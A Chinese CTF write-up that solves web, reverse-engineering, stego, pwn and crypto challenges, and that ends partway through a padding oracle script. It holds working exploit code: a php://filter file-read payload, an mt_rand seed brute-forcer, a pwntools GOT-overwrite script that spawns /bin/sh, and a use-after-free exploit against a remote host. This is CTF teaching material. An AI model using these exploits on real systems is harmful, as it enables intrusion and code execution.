class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">printf</span> <span class="string">&quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot;</span> | cat - 3207b7443805336f105c63c6f9948f0c9ae7a4 | gunzip | hexdump -C</span><br></pre></td></tr></table></figure><p>得到源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&quot;action&quot;</span>]))&#123;</span><br><span class="line">  $page = $_GET[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  $page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(file_exists($page.<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line">  $file = file_get_contents($page.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">  <span class="keyword">echo</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">&quot;action&quot;</span>]==<span class="string">&quot;album&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&quot;pid&quot;</span>]))&#123;</span><br><span class="line">     curl($_GET[<span class="string">&quot;pid&quot;</span>]);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现有  <code>flag.php</code>，<br>访问 <code> http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/index.php?action=flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&quot;flag&#123;149922b5-27da-44b7-92b5-3c1ccfa75264&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="Step-By-Step"><a href="#Step-By-Step" class="headerlink" title="Step By Step"></a>Step By Step</h1><p>顺手扫了一下文件，发现有这些文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;robots.txt</span><br><span class="line">&#x2F;index.php</span><br><span class="line">&#x2F;file.php</span><br><span class="line">&#x2F;flag.php</span><br><span class="line">&#x2F;admin.php</span><br></pre></td></tr></table></figure><p>打开，<code>robots.txt</code> ，里面提示 <code>code.zip</code>  ，然后 down 下来是被 <code>phpjiami</code> 加密代码，然后解密一下，得到三个源文件 <code>index.php</code> 、 <code>admin.php</code> 、 <code>file.php</code>, 进行代码审计<br>首先看一下 <code>index.php</code>，是一个随机种子爆破的漏洞，写了一个爆破脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(‘max_execution_time’, ‘<span class="number">0</span>’);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化seed</span></span><br><span class="line">$seed = <span class="number">0</span>;</span><br><span class="line">$key = <span class="string">&#x27;填入index.php返回的key值&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth_code</span>(<span class="params">$length = <span class="number">12</span>, $special = <span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">    $chars = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ($special) &#123;</span><br><span class="line">        $chars .= <span class="string">&#x27;!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $password = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $password .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;=<span class="number">99999</span>; $i++)&#123;</span><br><span class="line">    mt_srand($i);</span><br><span class="line">    $hash1 = auth_code(<span class="number">16</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($hash1 === $key) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;find seeds :&quot;</span>.$i.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">      $seed = $i;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pri = auth_code(<span class="number">10</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;private值为： &#x27;</span>.$pri;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/64377317.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/64377317.jpg"></a></p><p>然后发 index.php 发 post 请求，<code>private=X6B4CdeBOR</code>，此时会提示 <code>No private!</code> ，因为此时session为空，所以第一次会将private存入到session，再发送相同的请求，就会直接跳转到 <code>http://959b616a1c194d4d83f5b75a7a2f7ec6f63163b4fcbe4482.game.ichunqiu.com/admin.php?authAdmin=2017CtfY0ulike</code>。</p><p>再来看下 <code>admin.php</code>， 有一个 <code>json_decode($auth) == $auth_code</code> ，使用 0 进行弱类型绕过。此时出来一个表单，但是点击没有反应，查看js，使用了 ajax 进行提交，可以进行抓包。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  filename = $(<span class="string">&quot;#filename&quot;</span>).val();</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">    url: <span class="string">&#x27;file.php&#x27;</span>,</span><br><span class="line">    type: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: filename,</span><br><span class="line">      <span class="string">&#x27;auth&#x27;</span>: <span class="string">&#x27;1234567890x&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    dataType: <span class="string">&#x27;text&#x27;</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(result);</span><br><span class="line">    &#125;,</span><br><span class="line">    error: <span class="function"><span class="keyword">function</span>(<span class="params">XMLHttpRequest, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(XMLHttpRequest);</span><br><span class="line">      <span class="built_in">console</span>.log(textStatus);</span><br><span class="line">      <span class="built_in">console</span>.log(errorThrown);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时再看下 <code>file.php</code> ，传 id ，字符串需要包含有 <code>jpg</code> 和 满足正则 <code>preg_match(&quot;/^php:\/\/.*resource=([^|]*)/i&quot;, trim($id), $matches);</code> ，于是采用 php://filter 进行读取文件，联系到上面的 <code>flag.php</code>,于是 <code>id=php://filter/read=jpg/resource=flag.php</code>，拿到 flag</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/13290343.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/13290343.jpg"></a></p><h1 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h1><p>比较简单的应该逆向题目<br>运行程序，然后附加<br>这个时候已经出现了</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/55451041.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/55451041.jpg"></a></p><p>上面这样的字符串，我们在程序中搜索，并在关键跳转比较的地方下好断点</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/65243748.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/65243748.jpg"></a></p><p>可以看到一个比较字符串长度的地方</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/71910154.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/71910154.jpg"></a></p><p>所以我们的输入应该是长度为42的字符串</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/50494136.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/50494136.jpg"></a></p><p>我们的输入与 <code>this_is_not_flag</code> 按位循环异或，然后与</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66493764.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66493764.jpg"></a></p><p>eax*n+401250比较，我们查看这块内存</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/4110967.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/4110967.jpg"></a></p><p>每一位n就会eax的值就会+1 所以刚好对应下面的42给字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;this_is_not_flag&#x27;</span></span><br><span class="line">num = [<span class="number">0x12</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x14</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0x4a</span>, <span class="number">0x3d</span>, <span class="number">0x56</span>, <span class="number">0xa</span>, <span class="number">0x10</span>, <span class="number">0x67</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x46</span>, <span class="number">0x5a</span>, <span class="number">0x44</span>, <span class="number">0x42</span>, <span class="number">0x6e</span>, <span class="number">0xc</span>, <span class="number">0x44</span>, <span class="number">0x72</span>, <span class="number">0xc</span>, <span class="number">0xd</span>, <span class="number">0x40</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0x5f</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x4c</span>, <span class="number">0x5e</span>, <span class="number">0x5b</span>, <span class="number">0x17</span>, <span class="number">0x6e</span>, <span class="number">0xc</span>, <span class="number">0x16</span>, <span class="number">0x68</span>, <span class="number">0x5b</span>, <span class="number">0x12</span>]</span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">n = i%<span class="number">16</span></span><br><span class="line">flag += str(chr(ord(key[n])^num[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="juckcode"><a href="#juckcode" class="headerlink" title="juckcode"></a>juckcode</h1><p>类base64</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/49828264.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/49828264.jpg"></a></p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/68120400.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/68120400.jpg"></a></p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/19403609.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/19403609.jpg"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = file(<span class="string">&#x27;flag.enc&#x27;</span>).read().strip()</span><br><span class="line">data1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">data1 += chr(ord(i)<span class="number">-0x10</span>)</span><br><span class="line">data1 = data1.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">bd = base64.b64encode(data1)</span><br><span class="line">t1 = string.uppercase+string.lowercase+string.digits+<span class="string">r&#x27;+/&#x27;</span></span><br><span class="line">t2=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t1:</span><br><span class="line">t2 += chr(ord(i)<span class="number">-10</span>)</span><br><span class="line">table1 = string.maketrans(t1,t2)</span><br><span class="line">table2 = string.maketrans(t2,t1)</span><br><span class="line">bd1 = bd.translate(table1)</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bd1)/<span class="number">4</span>):</span><br><span class="line">s += bd1[<span class="number">4</span>*i]</span><br><span class="line">bd2 = s.translate(table2)</span><br><span class="line">n = <span class="number">3</span>-len(bd2)%<span class="number">3</span></span><br><span class="line">bd2 += <span class="string">&#x27;=&#x27;</span>*n</span><br><span class="line"><span class="keyword">print</span> base64.b64decode(bd2)</span><br></pre></td></tr></table></figure><h1 id="登机牌"><a href="#登机牌" class="headerlink" title="登机牌"></a>登机牌</h1><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/84157457.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/84157457.jpg"></a></p><p>在图片的末尾发现rar字样，扣出来，并且加上rar的头</p><p>这是一个rar压缩包，然而加密了</p><p>重新找线索，之前二维码利用过了，没什么其他信息，然而，条形码还没用过</p><p>反色扫描</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/86192358.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/86192358.jpg"></a></p><p>得到key 后面的数字就是密码了  解压得到flag</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66798604.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66798604.jpg"></a></p><h1 id="list"><a href="#list" class="headerlink" title="list"></a>list</h1><p>题目比较简单，表面看是堆利用的题目，但是其实和堆没什么关系。就是把申请到的chunk的指针依次放入到一个chunk_table中，然后增加chunk数量的索引值。<br>漏洞出现在Delete函数上，<br><a href="http://oayoilchh.bkt.clouddn.com/17-11-5/8099462.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/8099462.jpg"></a><br>可以发现，其实并没有free掉chunk，只是把之前申请到的chunk数量的索引值，做了一个简单的减法。<br>所以可以一直调用Delete函数，不断的去减少这个索引值，也就说这个索引值可以变成负数，那么就可以索引到我的chunk_table地址之前的任何一个地址。接下来调用Show函数和Edit函数就能按照索引到的这个地址存储的指针来泄漏和修改。<br><a href="http://oayoilchh.bkt.clouddn.com/17-11-5/60393945.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/60393945.jpg"></a><br>接下来要想修改GOT表，那么需要我索引到的地址中存了一个GOT表地址，发现确实是有这种地址。<br><a href="http://oayoilchh.bkt.clouddn.com/17-11-5/2124193.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/2124193.jpg"></a><br><a href="http://oayoilchh.bkt.clouddn.com/17-11-5/66882215.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/66882215.jpg"></a><br>也就是说调用Delete函数263007次之后，就能索引到 0x602080 - 8*263007 =0x400588 这个地址，接下来调用Show函数和Edit函数就能泄漏libc，并且修改GOT表了。把这里改成system函数的地址就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./list&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;106.75.8.58&#x27;, 13579)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;5.Exit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input your content:\n&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;5.Exit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;5.Exit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;5.Exit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">263007</span>):</span><br><span class="line">    <span class="comment">#print x</span></span><br><span class="line">    Delete()</span><br><span class="line"></span><br><span class="line">Show()</span><br><span class="line">content = io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">libc_base = u64(content.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base = &#x27;</span> + hex(libc_base)) </span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">Edit(p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;5.Exit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="p200"><a href="#p200" class="headerlink" title="p200"></a>p200</h1><p>uaf 控制指针到后门的地方</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./p200&quot;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;106.75.8.58&quot;</span>,<span class="number">12333</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;free\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;free\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;free\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Please input the length:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;48&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">20</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;free\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Please input the length:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;48&quot;</span>)</span><br><span class="line">io.sendline(p64(<span class="number">0x602d90</span>)+<span class="string">&quot;mdzzdmzxzasas&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Is-aes-secure"><a href="#Is-aes-secure" class="headerlink" title="Is_aes_secure"></a>Is_aes_secure</h1><p>Padding oracal</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ct = <span class="string">&#x27;4141414141414141414141414141414173f880342a533d069b3d2c33ea2c452aaac1cdf6ccb81e51f081a90ea411fe9edbd6bf6de7bab502dabdb9c51b7fb490&#x27;</span></span><br><span class="line">printable_chars = range(<span class="number">32</span>, <span class="number">128</span>) + range(<span class="number">5</span>,<span class="number">17</span>)</span><br><span class="line">padding_chars = range(<span class="number">1</span>, <span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>(<span class="params">cipher, conn</span>):</span></span><br><span class="line">    cipher = cipher.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    conn.send(<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">    conn.recv()</span><br><span class="line">    conn.send((<span class="string">&#x27;A&#x27;</span>*<span class="number">16</span>).encode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    conn.recv()</span><br><span class="line">    conn.send(cipher.encode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> conn.recv() == <span class="string">&#x27;Decrpytion Done\n&#x27;</span>:</span><br><span class="line">        conn.recv()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        